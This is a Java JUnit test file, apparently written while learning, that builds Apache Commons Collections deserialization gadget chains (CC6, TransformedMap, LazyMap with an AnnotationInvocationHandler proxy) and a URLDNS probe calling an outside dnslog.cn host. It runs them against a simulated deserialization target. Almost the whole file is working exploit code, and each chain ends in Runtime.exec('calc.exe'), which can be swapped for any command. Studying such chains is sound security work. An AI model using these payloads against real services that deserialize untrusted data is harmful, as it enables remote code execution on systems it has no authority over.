package com.endlessshw.serialization.test;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.LazyMap;
import org.apache.commons.collections4.map.TransformedMap;
import org.junit.jupiter.api.Test;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.*;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.Arrays;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

/**
 * @author hasee
 * @version 1.0
 * @description: 测试 transformed 的测试类
 * @date 2023/4/5 11:26
 */
public class CCTest {

    @Test
    public void testCC6() throws NoSuchFieldException, IllegalAccessException {
        // 1. 构造链
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer<>(Runtime.class),
                new InvokerTransformer<>("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer<>("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer<>("exec", new Class[]{String.class}, new Object[]{"calc.exe"}),
        };
        ChainedTransformer transformedChain = new ChainedTransformer(transformers);

        // 2. 构造 LazyMap，先不传链的后半部分，让链断开，这样 put 时不会触发链
        HashMap<Object, Object> hashMap = new HashMap<>();
        LazyMap<Object, Object> lazyMap = LazyMap.lazyMap(hashMap, new ChainedTransformer());

        // 3. 创建一个 TiedMapEntry，注意这里，它最终会调用到 LazyMap.get("aaa")，由于 LazyMap 中没有键为 aaa，所以会向里面塞一个 aaa，从而导致反序列化时无法执行
        TiedMapEntry lazyMapIntegerTiedMapEntry = new TiedMapEntry<>(lazyMap, "aaa");

        // 4. 创建一个用于被序列化的 HashMap
        HashMap toBeSerializedHashMap = new HashMap<>();

        // 5. 塞入
        toBeSerializedHashMap.put(lazyMapIntegerTiedMapEntry, 1);

        // 6. 把 lazyMap 中塞入的 key 给去掉
        lazyMap.remove("aaa");

        // 7. 通过反射获取 LazyMap 的值，put 后改回来，最终让其在反序列化时触发
        Field factoryField = lazyMap.getClass().getDeclaredField("factory");
        factoryField.setAccessible(true);
        factoryField.set(lazyMap, transformedChain);

        String serialize = serialize(toBeSerializedHashMap);
        unSerialize(serialize);
    }

    @Test
    public void testTransformedMap() throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException {
        // 构造转换器链
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"}),
        };
        Transformer transformedChain = new ChainedTransformer(transformers);

        // 触发转换器链内所有转换器的 transform()
        HashMap<String, String> hashMap = new HashMap<>();
        TransformedMap<String, String> transformedMap = TransformedMap.transformingMap(hashMap, null, transformedChain);
        hashMap.put("value", "随便");
        // transformedMap.entrySet().iterator().next().setValue("123");

        // 通过反射，获取到 class 类对象
        Class<?> aIHClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        // 通过 class 类对象获取 class 类对象的构造函数
        Constructor<?> aIHClassDeclaredConstructor = aIHClass.getDeclaredConstructor(Class.class, Map.class);
        // 取消其访问检查（即绕过 protected 和 private 关键字修饰，直接对其变量赋值），
        aIHClassDeclaredConstructor.setAccessible(true);
        // 通过 class 类对象的构造函数实例化对象
        // 这里第一个参数要注意，
        Object newInstance = aIHClassDeclaredConstructor.newInstance(Target.class, transformedMap);
        String serialize = serialize(newInstance);
        unSerialize(serialize);
    }

    @Test
    public void testLazyMap() throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException {
        // 1. 构造链
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"}),
        };

        Transformer transformedChain = new ChainedTransformer(transformers);

        // 2. 构造 LazyMap（同时也相当于创建被代理类）
        HashMap<Object, Object> map = new HashMap<>();
        LazyMap lazyMap = LazyMap.lazyMap(map, transformedChain);

        // 3. 把 AnnotationInvocationHandler 的构造函数搞出来
        // 通过反射，获取到 class 类对象
        Class<?> aIHClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        // 通过 class 类对象获取 class 类对象的构造函数
        Constructor<?> aIHClassDeclaredConstructor = aIHClass.getDeclaredConstructor(Class.class, Map.class);
        // 取消其访问检查（即绕过 protected 和 private 关键字修饰，直接对其变量赋值），
        aIHClassDeclaredConstructor.setAccessible(true);

        // 4. 先搞出来一个调用处理器，这里第一个参数没有要求
        InvocationHandler invocationHandler = (InvocationHandler) aIHClassDeclaredConstructor.newInstance(Override.class, lazyMap);

        // 5. 创建代理对象（被代理类已经创建好了）
        System.out.println(Arrays.toString(lazyMap.getClass().getInterfaces()));
        Map proxyMap = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]{Map.class}, invocationHandler);

        // 6. 实例化并被序列化的对象（注意这里要传入代理对象，这样才能在其 readObject() 中调用代理对象的方法（即 entrySet()）
        Object toBeSerializedObj = aIHClassDeclaredConstructor.newInstance(Override.class, proxyMap);

        // 7. 序列化
        String serializedStr = serialize(toBeSerializedObj);

        unSerialize(serializedStr);
    }

    @Test
    public void testDNSLog() throws MalformedURLException, NoSuchFieldException, IllegalAccessException {
        HashMap<URL, Integer> hashMap = new HashMap<URL, Integer>();
        // 1. 创建 URL，其访问地址为 burp 生成的用于检测 DNSLog 的，当然 dnslog 也行
        URL url = new URL("http://apcv57.dnslog.cn/");

        // 2. 在 put 前通过反射将键为 url 的 hashCode 改成 -1
        Class<? extends URL> urlClass = url.getClass();
        // 获取对象内的属性
        Field hashCode = urlClass.getDeclaredField("hashCode");
        // 忽略其安全限制（无效化 private、protected 关键字）
        hashCode.setAccessible(true);
        // put 前改为非 -1
        hashCode.setInt(url, 1);

        // 3. 塞进去
        hashMap.put(url, 1);

        // 4. 序列化前改回 -1
        hashCode.setInt(url, -1);

        // 5. 序列化
        String serialize = serialize(hashMap);
        unSerialize(serialize);
    }

    // 序列化
    public String serialize(Object payload) {
        // 创建恶意类
        ObjectOutputStream out = null;
        try {
            // 将恶意类序列化（这里不用文件流，改用字节流并用 base64 加密
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            out = new ObjectOutputStream(byteArrayOutputStream);
            out.writeObject(payload);
            // 这里一定要用 toByteArray 将每个字节转成 string 后再编码。如果先 byteArrayOutputStream.toString() 全部转成 string 再 base64 编码，就会出现问题。
            return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());
        } catch (IOException e) {
            throw new RuntimeException(e);
        } finally {
            try {
                if (out != null) {
                    out.flush();
                    out.close();
                }
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }
    }

    public void unSerialize(String serialize) {
        // 模拟反序列化靶场
        ObjectInputStream objectInputStream = null;
        try {
            objectInputStream = new ObjectInputStream(new ByteArrayInputStream(Base64.getDecoder().decode(serialize)));
            // 靶场调用了 readObject()
            objectInputStream.readObject();
        } catch (IOException | ClassNotFoundException e) {
            throw new RuntimeException(e);
        } finally {
            try {
                if (objectInputStream != null) {
                    objectInputStream.close();
                }
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }
    }
}
